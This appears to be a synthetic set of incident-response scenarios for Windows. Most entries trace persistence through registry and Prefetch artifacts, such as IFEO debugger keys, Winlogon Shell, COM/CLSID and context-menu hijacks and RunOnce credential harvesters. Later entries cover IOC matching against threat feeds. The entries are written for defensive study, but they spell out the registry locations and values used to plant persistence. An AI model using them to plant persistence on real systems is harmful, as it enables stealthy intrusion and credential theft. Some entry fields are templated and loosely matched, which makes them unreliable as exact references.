- **MITRE**: T1053.005
- **Impact**: Task injection via registry timestamp
- **Tools**: FTK Imager, Task Scheduler Viewer, MFT, Prefetch Parser
- **Scenario**: Attacker modifies task XML to inject malicious payload
- **Attack Steps**: Modified scheduled task discovered by analyzing task XML files in C:\Windows\System32\Tasks\. MaintenanceTask includes new Action element pointing to payload.exe. Registry confirms the task's registration timestamp changed. MFT shows EXE dropped prior. Prefetch proves repeated execution every hour. Memory confirms EXE includes keylogging and beacon module. Timeline correlates all components. SOC deletes task, cleans registry, and hashes.
- **Detection**: Registry + Tasks + Prefetch
- **Solution**: Repeated hourly persistence trigger
- **Tags**: #tasktamper #registrytimestamp #sctpersist

## Registry & Prefetch Confirm Persistence via Debugger Value in IFEO Key

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: IFEO Debugger key abuse
- **MITRE**: T1546.012
- **Impact**: Registry → fake Debugger EXE
- **Tools**: FTK Imager, Registry Explorer, MFT, ProcMon
- **Scenario**: Attacker uses IFEO Debugger key to reroute calc.exe to malware
- **Attack Steps**: Registry key HKLM\...\Image File Execution Options\calc.exe has Debugger set to C:\Windows\Temp\backcalc.exe. MFT confirms backcalc.exe created 2 mins prior. Prefetch shows calc.exe execution launches malware. ProcMon reveals backcalc.exe opens socket to attacker domain. Timeline proves key → redirection → remote shell activation. SOC deletes IFEO key and DLL, blacklists binary.
- **Detection**: Registry + Prefetch + ProcMon
- **Solution**: Timeline traces redirected execution
- **Tags**: #ifeodebugger #calcdivert #regpersist

## Screensaver EXE Persistence Discovered via Registry and Prefetch Timeline

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Screensaver executable hijack
- **MITRE**: T1547.001
- **Impact**: Executes malicious .scr binary when session is idle
- **Tools**: FTK Imager, Registry Viewer, Volatility, Plaso Timeline, Procmon
- **Scenario**: Attacker deploys custom .scr file and sets it as screensaver to establish stealth persistence
- **Attack Steps**: During IR analysis of a suspected dormant system beaconing at idle hours, forensic analysts examine registry keys related to user-specific configurations. Under HKCU\Control Panel\Desktop, they locate SCRNSAVE.EXE pointing to C:\Users\Public\saver.scr, a non-standard executable file disguised as a screensaver. Timeline analysis reveals that this registry key was edited within 5 minutes of a suspicious download via Chrome, confirmed through browser history artifacts. MFT and file metadata show saver.scr created by the browser process itself. Prefetch entries (saver.scr-<hash>.pf) confirm it has executed multiple times, specifically correlating with session idle events. Further analysis with Volatility uncovers saver.scr as an injected process utilizing WinExec() to spawn powershell.exe with an obfuscated base64 payload, creating scheduled tasks and attempting lateral movement using WMI. Analysts compile full behavior mapping from idle event → screensaver activation → process injection → scheduled persistence → beaconing. Remediation includes full key deletion, registry lockdown via GPO, and implementation of idle session alerts.
- **Detection**: Registry, Prefetch, Volatility, Timeline
- **Solution**: Enables stealth backdoor at idle state
- **Tags**: #screensaverattack #regpersist

## TimeZone Configuration Abused to Trigger PowerShell Loader via Registry Edit

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Non-standard registry path abuse
- **MITRE**: T1546.001
- **Impact**: Triggers loader through system configuration
- **Tools**: FTK Imager, RegRipper, PowerShell Logs, Procmon, MFT Explorer
- **Scenario**: Registry key DynamicDaylightTimeDisabled modified to execute PowerShell loader on time zone changes
- **Attack Steps**: Analysts respond to unexplained scheduled PowerShell activity appearing post-boot. Registry parsing reveals HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation\DynamicDaylightTimeDisabled was replaced with a PowerShell command embedded using character obfuscation. MFT timeline confirms this key was written during a previously undetected scheduled task triggered at midnight. PowerShell logging (4104) reveals decoded content that uses Invoke-WebRequest to fetch and launch a second-stage loader from a domain tied to C2 infrastructure. Prefetch confirms execution of powershell.exe with arguments matching the encoded script. Procmon reveals the chain starting with a system service tzchange.exe reading the registry and spawning the shell. Analysts piece together: registry edit → time zone service → PowerShell stager → memory loader. Mitigation included rollback of the registry key, disabling script execution policy bypass, and adding Sysmon rule for unusual TimeZoneInformation key access.
- **Detection**: Registry, PowerShell Logs, Procmon
- **Solution**: Obscure abuse vector bypasses typical EDR alerts
- **Tags**: #timezonebypass #powershellpersist

## Print Monitor Registry Key Used to Launch Malicious .vbs Dropper

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: VBS script load via print registry hijack
- **MITRE**: T1547.010
- **Impact**: Print monitor abuse for stealth loader
- **Tools**: FTK Imager, Registry Viewer, Event Logs, Autoruns
- **Scenario**: .vbs script planted via phishing email is executed at login through modified Print\Monitors registry key
- **Attack Steps**: During forensic triage of suspicious periodic outbound traffic on port 80, analysts examine persistence mechanisms. The HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\HP Universal Printing key, normally pointing to a DLL, now references C:\Users\Public\init.vbs. Timeline and MFT confirm the file arrived via email attachment opened in Outlook. Prefetch shows wscript.exe launched during user login, which corresponds to init.vbs. Script analysis shows embedded WScript.Shell.Run("powershell.exe -enc ..."), decoding to credential scraping and clipboard monitoring script. Event logs tie wscript activity to login time. Memory analysis captures the script alive in runtime. SOC documents complete chain: phishing → dropper → registry edit → startup execution. Response includes removal of registry key, execution of AV across roaming profiles, and forensic review of all Monitors subkeys for anomalies.
- **Detection**: Registry + Prefetch + Email Artifacts
- **Solution**: Print driver registry abused for lateral trigger
- **Tags**: #printmonitorbypass #vbscriptloader

## AHK Macro-Based Malware Executed via .txt File Association Hijack

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: File handler hijack via AHK payload
- **MITRE**: T1546.001
- **Impact**: .txt open triggers macro executable
- **Tools**: FTK Imager, Registry Viewer, AutoHotKey Decompiler, MFT Timeline
- **Scenario**: Registry modifies .txt shell association to launch malicious AHK-compiled EXE
- **Attack Steps**: Anomalous activity correlates with users opening .txt files. Registry analysis shows HKCR\txtfile\shell\open\command now points to C:\Temp\open_txt.exe, which is not a legitimate notepad.exe path. File inspection reveals AHK-compiled EXE that simulates GUI operations to disable Defender using registry manipulation (Set-MpPreference). MFT shows open_txt.exe created by outlook.exe after receiving a zip attachment. Prefetch indicates it executed at every user double-click on a .txt file. AHK decompilation shows keystroke simulation and firewall rule creation. Timeline: phishing email → dropper unzip → registry edit → daily trigger. SOC enforces default file association policy and detects registry write attempts to txtfile shell.
- **Detection**: Registry + Prefetch + AHK Decompile
- **Solution**: Stealth persistence via normal user behavior
- **Tags**: #fileassocpersist #ahkmacro

## WMI Filter and Consumer Registry Artifacts Reveal Stealth VB Loader

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Scheduled execution via WMI consumer
- **MITRE**: T1047, T1084
- **Impact**: Registry-stored WMI triggers script
- **Tools**: FTK Imager, RegRipper, Event Viewer, WMIEvt Logs
- **Scenario**: Registry traces reveal WMI event setup that silently executes .vbs script during idle hours
- **Attack Steps**: System shows periodic outbound traffic at 2AM with no logged user session. Analysts examine HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Wbem and discover new __EventFilter and CommandLineEventConsumer keys. The Query field checks for Win32_LocalTime.Hour=2 and consumer launches wscript.exe with embedded path to a malicious .vbs. Timeline shows these registry keys created post-phishing doc interaction. Prefetch confirms script executed daily. Memory reveals obfuscated code spawning an encoded PowerShell script fetching stage 2. SOC disables WMI subscriptions and pushes GPO to block wscript.
- **Detection**: Registry + WMIEvt + Prefetch
- **Solution**: Time-based stealth VB payload delivery
- **Tags**: #wmipersist #vbsregistryloader

## Registry Run Key Points to Excel with Auto-Exec Macro

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Registry starts Excel macro file
- **MITRE**: T1137.006
- **Impact**: Office macro used as startup payload
- **Tools**: FTK Imager, OfficeMalscanner, Registry Viewer, Outlook Artifacts
- **Scenario**: Excel with hidden macro is launched at boot using Run key
- **Attack Steps**: Analysts investigate reports of Excel auto-launching on boot. In HKCU\Software\Microsoft\Windows\CurrentVersion\Run, an entry exists: excel.exe /r "C:\Users\Public\runmacro.xlsm". MFT confirms runmacro.xlsm received via phishing mail. OfficeMalscanner reveals the presence of Workbook_Open() macro executing a base64 shell that launches powershell.exe with embedded loader. Prefetch confirms Excel launches daily. Timeline connects email delivery → macro creation → registry persistence → live beaconing. Memory confirms runtime persistence via Excel COM object. Mitigation includes macro blocking policy, registry cleanup, and AV rule for .xlsm auto-run.
- **Detection**: Registry + Office Scanner + Prefetch
- **Solution**: Document-based stealth loader
- **Tags**: #excelmacro #registryautostart

## Right-Click Context Menu Registry Hijack Launches Dropper EXE

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Right-click context menu registry hijack
- **MITRE**: T1546.001
- **Impact**: Dropper disguises as WinRAR extract command
- **Tools**: FTK Imager, Registry Viewer, MFT Explorer, Volatility, Procmon
- **Scenario**: Attacker modifies archive file context menu in registry to execute malicious dropper disguised as extraction tool
- **Attack Steps**: During incident response involving suspicious explorer crashes and unauthorized data exfiltration, analysts reviewed context menu-related registry keys. In HKCR\WinRAR\Shell\Extract Here\Command, instead of the legitimate extract command, the value pointed to C:\Users\Public\extractor.exe. MFT and $LogFile analysis showed this binary was created during an RDP session tied to a temporary account. Timeline correlation with Prefetch confirmed the binary was executed within seconds of a user right-clicking on a .zip archive. Volatility revealed injected threads from extractor.exe running inside explorer.exe’s memory space and spawning hidden PowerShell scripts that exfiltrated sensitive document folders to an external FTP server. The registry edit served as an invisible persistence mechanism triggered purely through normal user behavior. Response included reverting registry keys, killing injected processes, rotating FTP credentials, and reviewing all file association registry entries system-wide.
- **Detection**: Registry, MFT, Prefetch, Memory
- **Solution**: User interaction hijacked to launch malware
- **Tags**: #contextmenuhijack #zipdropper

## Scheduled Task DLL Loading via Registry Misrouting Uncovered

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Malicious DLL load via registry task misdirection
- **MITRE**: T1053.005, T1543.003
- **Impact**: Service points to attacker DLL loaded by scheduler
- **Tools**: FTK Imager, Registry Explorer, Task Scheduler Viewer, PEStudio, Volatility
- **Scenario**: Registry path to service DLL altered to point to malicious DLL executed by a scheduled task
- **Attack Steps**: SOC flagged suspicious scheduled task named "UpdaterService" running svchost.exe, yet unsigned DLL behavior was observed. Analysts examined the key HKLM\SYSTEM\CurrentControlSet\Services\UpdaterService\Parameters\ServiceDll and found it pointed to C:\Temp\upd.dll, a malicious DLL not signed by Microsoft. MFT showed that the DLL and registry edit both occurred within 90 seconds of a successful lateral movement event from a compromised host via SMB. Prefetch entries revealed the scheduled task had executed multiple times, loading the DLL through svchost.exe. Volatility confirmed that the DLL injected remote shellcode into lsass.exe, harvesting credentials. Timeline analysis tied the DLL load to credential theft and periodic beaconing over HTTPS. Response involved disabling the scheduled task, replacing the DLL, reviewing other service-related registry keys, and blacklisting all variants of upd.dll across the organization.
- **Detection**: Registry, Prefetch, Memory, Scheduled Tasks
- **Solution**: Facilitates privileged code execution with stealth
- **Tags**: #taskdllinject #servicedllpersist

## MRU + Prefetch Reveal Use of Stealth RDP Credential Theft Tool

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: RDP credential dumping via stealthy EXE
- **MITRE**: T1003.001
- **Impact**: No startup, triggered manually via hidden UI
- **Tools**: FTK Imager, UserAssist Viewer, Prefetch Parser, ShellBags Explorer, Volatility
- **Scenario**: RDP password dump tool discovered via unusual MRU key entries and Prefetch evidence
- **Attack Steps**: An investigation into unauthorized RDP logins revealed no obvious malware or scheduled tasks. Analysts turned to UserAssist and ShellBag registry keys, where they discovered the binary rdpdump.exe listed under recently executed applications, despite no shortcut or desktop presence. Prefetch records confirmed that the tool had been executed multiple times with parameters like /exportcreds. MFT timeline analysis showed the file was copied onto the system via a USB device 20 minutes before its first execution. Volatility analysis revealed memory-resident processes associated with rdpdump.exe querying LSASS and dumping credentials to an encrypted file in %TEMP%. No AV alerts were triggered due to the tool’s legitimate signature and anti-debugging techniques. Forensic response included credential rotation, group policy update to disable USB autorun, hash-based IOC scans across domain systems, and deactivation of orphaned user accounts.
- **Detection**: Registry + Prefetch + Volatility
- **Solution**: Low-noise, high-value credential exfiltration
- **Tags**: #rdpdump #mruhunter

## COM Hijack via Registry CLSID Key Targets Sticky Keys

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Accessibility COM hijack to run attacker DLL
- **MITRE**: T1546.008
- **Impact**: Sticky Keys rerouted to DLL with elevated access
- **Tools**: FTK Imager, CLSID Viewer, Registry Explorer, Volatility, Sysmon
- **Scenario**: Attacker reroutes COM CLSID key to DLL that executes on accessibility shortcut trigger
- **Attack Steps**: A user reports unusual behavior after accidentally triggering Sticky Keys (Shift x5). Analysts review the registry and locate a modified CLSID key: HKLM\Software\Classes\CLSID\{XXXX} pointing to C:\Temp\accesshook.dll. This DLL was unsigned and contained obfuscated shellcode with C2 communication. Prefetch data showed recent execution of sethc.exe, the Sticky Keys executable. Memory forensics using Volatility confirmed that the DLL injected itself into explorer.exe and spawned a cmd shell with SYSTEM privileges. Sysmon logs traced the DLL load to user logon time, and MFT timeline correlated DLL creation with a phishing attachment containing a password-protected ZIP. The attacker exploited Sticky Keys accessibility feature as a stealth trigger vector, bypassing login screen authentication. Remediation included removing the hijacked COM reference, deleting the malicious DLL, enforcing signed DLL policy, and disabling Sticky Keys pre-login trigger via GPO.
- **Detection**: Registry + Prefetch + Volatility
- **Solution**: Pre-login persistence with SYSTEM shell access
- **Tags**: #accessibilityabuse #comdllhijack

## Registry + Prefetch Confirm Shell Key Hijack to Launch Covert RAT

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Winlogon Shell key hijack
- **MITRE**: T1547.001
- **Impact**: Replaces explorer.exe to chain in RAT
- **Tools**: FTK Imager, Registry Explorer, Plaso, Volatility
- **Scenario**: Attacker replaces user shell with custom executable RAT
- **Attack Steps**: During forensic investigation of a workstation exhibiting delayed desktop rendering and network anomalies, analysts explore the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon registry key. The Shell value, which normally contains explorer.exe, instead references explorer.exe && C:\ProgramData\svchost32.exe. Plaso timeline analysis confirms the modification occurred at 11:26:02 PM, correlating precisely with an anomalous outbound beacon detected by EDR. The binary svchost32.exe is confirmed to be unsigned and was dropped into the ProgramData directory five minutes earlier. MFT confirms the creation time, while Prefetch artifacts show svchost32.exe executing immediately after explorer.exe during every login. Memory inspection via Volatility reveals that svchost32.exe injects shellcode into winlogon.exe using CreateRemoteThread, establishing a reverse shell over HTTPS. Analysts generate IOC based on binary hash and registry path. The key is reverted, the binary quarantined, and login-time process behavior is now monitored via custom Sysmon rules.
- **Detection**: Registry + MFT + Prefetch + Memory
- **Solution**: Forensic chain validates persistence
- **Tags**: #shellhijack #winlogon #ratpersist

## Registry RunOnce Hijack Launches Scripted Credential Harvester

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: RunOnce key abuse + script-based harvesting
- **MITRE**: T1547.001, T1059.001
- **Impact**: Script autostart → stealth data theft
- **Tools**: FTK Imager, Autoruns, Registry Viewer, ProcMon
- **Scenario**: Attacker leverages RunOnce key to inject harvesting script on next reboot
- **Attack Steps**: Analysts uncover irregular login delays on a critical terminal server. Registry inspection of HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce reveals an unusual entry: C:\Windows\Temp\init.bat. This batch script, upon execution, launches a PowerShell one-liner that writes clipboard contents and saved credentials from browsers into a local loot.txt, then exfiltrates it via FTP. MFT analysis confirms init.bat and loot.txt are recent and show timestamps aligned to a reboot event recorded in Windows Event Logs. Prefetch data shows cmd.exe and powershell.exe executing during the same login session. Further behavioral evidence via ProcMon confirms browser directories being accessed programmatically during script execution. Memory dump confirms active PowerShell instances with base64-encoded credential scraping logic in strings section. SOC adds detection for unusual RunOnce registry entries and blocks PowerShell base64 encoding by policy.
- **Detection**: Registry + Memory + ProcMon + Prefetch
- **Solution**: Timeline pinpoints boot-based exfil
- **Tags**: #runonceabuse #cliptheft #ftpexfil

## Prefetch Reveals DLL Dropped by Exploit Kit and Loaded via Registry Hijack

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Registry Run → rundll32 loader → injected DLL
- **MITRE**: T1574.001
- **Impact**: Browser → exploit kit → DLL persist
- **Tools**: FTK Imager, Browser History Viewer, Registry Explorer, Volatility
- **Scenario**: Registry modified to side-load DLL dropped by in-browser exploit
- **Attack Steps**: A drive-by download campaign is suspected following user complaints of browser crashes and slowdown. Browser history reveals visits to a suspicious hxxp://malad.site/load.html, where a known exploit kit was hosted. Analysts pivot to file system and registry for persistence evidence. The HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key contains an entry that executes rundll32.exe C:\Users\Public\svcchk.dll,EntryPoint. Plaso confirms that svcchk.dll was written to disk within seconds of the suspicious website visit. Prefetch records show rundll32.exe executing repeatedly at user login. The DLL's behavior includes decrypting strings in memory and invoking WinAPI functions like InternetOpenUrl, indicating C2 activity. Memory inspection with Volatility confirms thread injection from svcchk.dll into explorer.exe. IOC artifacts include DLL hash, modified registry paths, and IPs contacted. Incident response includes DLL deletion, registry fix, and blocklist update.
- **Detection**: Registry + Prefetch + Browser history
- **Solution**: Timeline connects exploit to persistence
- **Tags**: #exploitkitpersist #rundll32sideload #dllbackdoor

## Registry StartupApproved\Run Key Shows Signed Malware Abuse

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: StartupApproved key + signed malware
- **MITRE**: T1547.001, T1553.002
- **Impact**: Trusted key, signed malicious EXE
- **Tools**: FTK Imager, Registry Explorer, PEStudio, Event Viewer
- **Scenario**: Malware abuses Windows 10 startup approval keys for stealth loading
- **Attack Steps**: On a system running Windows 10, analysts investigate persistence mechanisms not triggering alerts. In HKLM\Software\Microsoft\Windows\CurrentVersion\StartupApproved\Run, an entry named UpdateChecker is enabled, pointing to C:\Users\Admin\AppData\Roaming\checksvc.exe. The EXE is signed by a stolen digital certificate, helping it evade AV. MFT confirms the file was placed five minutes before registry modification. Prefetch indicates it executes during each login. The binary communicates with known C2 over TCP 8080 and includes anti-debugging features. Timeline confirms entry creation during a period of known phishing activity targeting the user. Memory analysis reveals AES-encrypted blobs sent from checksvc.exe to 185.x.x.4. Remediation includes registry lockdown and revocation of stolen cert.
- **Detection**: Registry + Prefetch + Cert analysis
- **Solution**: Hidden persistence via legit-looking binary
- **Tags**: #startupapproved #signedmalware #certabuse

## Registry MRU Artifacts Trace Execution of Hidden Tools

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Registry MRU leak of hidden exe usage
- **MITRE**: T1003.004, T1003.006
- **Impact**: Hidden tool usage exposed via MRU
- **Tools**: FTK Imager, Registry Viewer, ShellBags Explorer
- **Scenario**: Attacker runs admin tools from hidden paths; MRU reveals usage
- **Attack Steps**: Analysts suspect unauthorized local privilege escalation but lack clear process evidence. They review registry MRU (Most Recently Used) keys including UserAssist, RecentDocs, and AppCompatFlags. UserAssist shows execution of C:\Users\Public\Tools\escalate.exe not seen in Prefetch due to NTFS timestamp spoofing. ShellBags confirm directory was browsed. Registry values show tool used several times. Analysts reconstruct execution flow and timeline. Memory reveals that escalate.exe triggered tokenduplication APIs. IOCs derived from UserAssist GUID, path, and binary fingerprint.
- **Detection**: Registry + Shellbags + Memory
- **Solution**: Stealth tool usage traced via artifacts
- **Tags**: #mruanalysis #userassist #stealthdetection

## Registry & Prefetch Prove Persistence via Startup Folder LNK and Scheduled Cleanup Script

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Startup LNK + scheduled task loop
- **MITRE**: T1053.005, T1547.001
- **Impact**: Re-spawning EXE persistence loop
- **Tools**: FTK Imager, Task Scheduler Viewer, LNK Analyzer
- **Scenario**: Malicious LNK in startup folder paired with script to auto-remove evidence
- **Attack Steps**: A user’s system repeatedly triggers AV for collector.exe, but the file disappears before inspection. Analysts find a C:\Users\User\Start Menu\Programs\Startup\collector.lnk pointing to the EXE in %APPDATA%\Temp\. Registry has task scheduler settings configured under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks, showing a task named CleanupCollector. The task runs hourly to delete collector.exe and recreate it daily from embedded script. Prefetch shows execution of EXE during login. Memory shows transient beaconing. Timeline: drop → execution → cleanup → re-persistence. Response includes disabling the task, registry lock, and script analysis.
- **Detection**: Registry + Prefetch + Task Cache
- **Solution**: Scheduled cleanup conceals persistence
- **Tags**: #lnkloop #taskreschedule #evadingav

## Registry Confirms Silent Context Menu Dropper Trigger

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Context menu hijack dropper
- **MITRE**: T1546.001
- **Impact**: Right-click triggers covert EXE
- **Tools**: FTK Imager, Registry Viewer, Event Tracer
- **Scenario**: Context menu shell key launches dropper silently on right-click
- **Attack Steps**: On a system with no obvious EXE persistence, analysts find that the HKCR\*\shell\Open With\command key was modified to run a custom dropper C:\ProgramData\contextloader.exe. Prefetch reveals this binary executes only when users right-click files. MFT confirms recent creation. The dropper spawns a child process that injects into explorer.exe. Memory snapshot reveals C2 IP and shellcode. Analysts reconstruct behavior: right-click → trigger dropper → in-memory payload. Solution involves restoring shell handler key and deleting binary.
- **Detection**: Registry + MFT + Prefetch + Memory
- **Solution**: GUI interaction abuse for persistence
- **Tags**: #contextpersist #shelldropper #registryabuse

## Registry Analysis Reveals Alternate CLSID Path for Covert DLL Load

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: CLSID path misdirection for DLL
- **MITRE**: T1546.015
- **Impact**: Alternate CLSID → stealth DLL
- **Tools**: FTK Imager, Registry Explorer, CLSID Mapper, Autoruns
- **Scenario**: Attacker sets alternate InprocServer32 path to load malicious DLL
- **Attack Steps**: Analysts investigate DLL loading behavior in explorer shell extensions. CLSID {C6D2D1E1...} under HKCR\Wow6432Node\CLSID\...\InprocServer32 points to C:\ProgramData\shimload.dll. Prefetch confirms explorer.exe loads it during boot. DLL decrypts embedded shellcode at runtime. Timeline tracks registry write, DLL drop, and repeated load cycles. Memory shows thread creation within explorer shell. Analysts blacklist CLSID and DLL.
- **Detection**: Registry + Prefetch + Memory
- **Solution**: Silent shell extension abuse
- **Tags**: #clsidmanip #dllhijack #registryhook

## Prefetch + Registry Show Persistence via Image Hijack of taskmgr.exe

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: IFEO Debugger reroute
- **MITRE**: T1546.012
- **Impact**: Hijacks Task Manager
- **Tools**: FTK Imager, Registry Viewer, ProcMon
- **Scenario**: IFEO Debugger key points taskmgr.exe to payload
- **Attack Steps**: User reports broken Task Manager. HKLM\...\IFEO\taskmgr.exe has Debugger key to fakecalc.exe. MFT confirms fakecalc.exe dropped recently. Prefetch shows execution chain. ProcMon confirms EXE spawns credential-dumping PowerShell script. Memory confirms C2 comms. Analysts delete key, quarantine binary, reset affected creds.
- **Detection**: Registry + Prefetch + Memory
- **Solution**: Fake tool triggers payload
- **Tags**: #ifeopersist #taskmgrhijack

## Registry Persistence via Explorer Shell Extension + COM Hijack

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Shell extension → COM → malicious DLL
- **MITRE**: T1546.015
- **Impact**: COM + Explorer shell combo
- **Tools**: FTK Imager, Autoruns, Volatility
- **Scenario**: Malicious COM object registered as shell extension
- **Attack Steps**: Registry CLSID points to C:\Windows\Temp\shellhook.dll. Explorer loads DLL at each file open. Prefetch confirms frequent explorer.exe → DLL loads. Memory reveals shellcode injecting C2 beacon. Analysts clean CLSID and DLL. IOC shared to EDR.
- **Detection**: Registry + Prefetch + Memory
- **Solution**: File opens trigger payload
- **Tags**: #shellcom #dllabuse

## EDR Alert Enrichment Using ThreatFox IP IOC

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: C2 beacon activity
- **MITRE**: T1071.001
- **Impact**: C2 communication via matched IP
- **Tools**: ThreatFox API, EDR (CrowdStrike), Splunk, DNS Logs
- **Scenario**: A suspicious outbound IP from an EDR alert is matched against the ThreatFox feed to confirm C2 infrastructure
- **Attack Steps**: 1. EDR generates an alert for suspicious PowerShell activity initiating an outbound connection to 185.244.25.101. 2. Analyst retrieves the destination IP and uses an automated enrichment script to query ThreatFox’s API. 3. The IP is found in the threat feed and is marked as active C2 linked to a known info-stealer campaign. 4. DNS logs and netflow data are pulled from SIEM to identify internal systems that resolved or connected to the IP. 5. Timeline reconstruction confirms the IP was contacted by two other hosts over 48 hours. 6. The IOC match is escalated, full memory dumps are taken from infected systems, and a retro-hunt is launched across historical logs for the IOC. 7. SOC adds the IOC to EDR’s custom block list and notifies ThreatFox of the live beaconing.
- **Detection**: ThreatFox, EDR, DNS
- **Solution**: Early detection of known threat infra
- **Tags**: #iocmatch #threatfox #ipblock

## Suspicious Portable Executable Hash Linked to Banking Trojan

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Trojan dropper hash match
- **MITRE**: T1204.002
- **Impact**: User executed malicious email attachment
- **Tools**: MISP, YARA, VirusTotal, FTK Imager, Velociraptor
- **Scenario**: Analysts receive an alert on a suspicious .exe hash that matches known malware from MISP feed
- **Attack Steps**: 1. Antivirus detects a PE file named invoice_final.exe dropped in the Downloads folder. 2. The file’s SHA-256 hash is submitted to MISP for correlation. 3. MISP returns a match to known Zeus Panda variant, last seen targeting European banks. 4. Further enrichment pulls the malware’s TTPs, including mutex creation, registry key alterations, and beaconing patterns. 5. YARA rules are updated based on the sample’s unique strings and applied retroactively across memory and file systems. 6. Velociraptor runs a hash hunt across all endpoints and detects 3 more machines with the same hash. 7. A coordinated quarantine is triggered, the IOC is uploaded to the internal TI platform, and malware samples are shared with IR partners for reverse engineering.
- **Detection**: MISP, AV Logs, Hash Search
- **Solution**: Stops malware spread via early hash detection
- **Tags**: #hashioc #mispmatch #bankingmalware

## Domain IOC Match During Investigation of Internal Phishing Site

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Cross-platform
- **Vulnerability**: Credential phishing
- **MITRE**: T1566.002
- **Impact**: Match confirms active phishing operation
- **Tools**: AlienVault OTX, WHOIS, Shodan, Splunk
- **Scenario**: An internal phishing page is identified; domain matches with an IOC in AlienVault OTX
- **Attack Steps**: 1. A phishing report leads SOC to investigate a suspicious internal portal (hr-verification[.]com). 2. WHOIS lookup reveals the domain was registered 3 days ago from a foreign registrar. 3. A check against AlienVault OTX confirms the domain is listed as part of an active credential harvesting campaign. 4. DNS logs and netflow data are pulled to identify all users that accessed the domain. 5. Analysts extract phishing page source, and find it submits credentials to an external domain also listed in OTX. 6. IR team blocks both domains at the proxy, adds them to the internal IOC feed, and triggers a password reset for all affected users. 7. Security awareness content is updated, and the phishing lure is added to internal email filters.
- **Detection**: DNS, Proxy, Threat Feeds
- **Solution**: Prevents lateral credential abuse
- **Tags**: #domainioc #phishingcampaign

## Detection of Cobalt Strike Beacon via IP Match in MISP

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Cobalt Strike IOC match
- **MITRE**: T1071.001
- **Impact**: Staging server match confirms threat
- **Tools**: MISP, EDR, Wireshark, PowerShell Logs
- **Scenario**: Suspicious outbound beaconing IP matches an IOC from MISP tied to Cobalt Strike
- **Attack Steps**: 1. PowerShell command line telemetry shows repeated Invoke-WebRequest calls to 198.50.131.199. 2. MISP enrichment reveals the IP as a staging server used in Cobalt Strike campaigns. 3. EDR confirms connections to the IP from three internal hosts during off-hours. 4. Analysts extract memory dumps and identify active named pipes tied to Cobalt Strike. 5. Beacon configuration is extracted using tools like cs beacon parser. 6. Analysts create custom detection logic in SIEM to flag future outbound traffic to known beaconing patterns. 7. Incident is documented as a confirmed APT foothold, and mitigation includes registry key cleanup, AV scans, and process injection detection.
- **Detection**: EDR, MISP, PowerShell
- **Solution**: Validates suspected APT infection
- **Tags**: #cobaltstrike #ipmatch #misp

## VirusTotal Hash Match Reveals Crypto-Miner Spread

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Miner via WMI persistence
- **MITRE**: T1546.003
- **Impact**: Stealth miner exploiting idle CPU
- **Tools**: VirusTotal, ThreatFox, Procmon, Sysmon, WMI Logs
- **Scenario**: Analysts match an executable hash to known Monero crypto-miner using VT and Abuse.ch
- **Attack Steps**: 1. Endpoint alerts show high CPU usage tied to an unknown process servicehost.exe. 2. The hash is submitted to VirusTotal and returns as known XMRig crypto-miner with 45/70 detections. 3. ThreatFox confirms associated wallet address tied to same miner campaign. 4. Procmon analysis shows the binary persists using WMI subscription triggering every 10 minutes. 5. Sysmon logs confirm it injects shellcode into explorer.exe. 6. Hunt across environment finds four more infected devices running the same miner. 7. SOC blocks the hash in AV and EDR systems, removes WMI event consumers, and alerts finance teams to review CPU usage trends.
- **Detection**: Hash, WMI, VT
- **Solution**: Reduces resource drain and lateral miner spread
- **Tags**: #cryptomining #hashmatch

## IOC Correlation Across Email Gateway and MISP Uncovers APT Lure

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Cross-platform
- **Vulnerability**: Spear phishing campaign
- **MITRE**: T1566.001
- **Impact**: Early IOC match exposes wide attack scope
- **Tools**: MISP, Email Gateway, YARA, Abuse.ch
- **Scenario**: An IOC found in an email lure is matched in MISP and reveals broader targeting
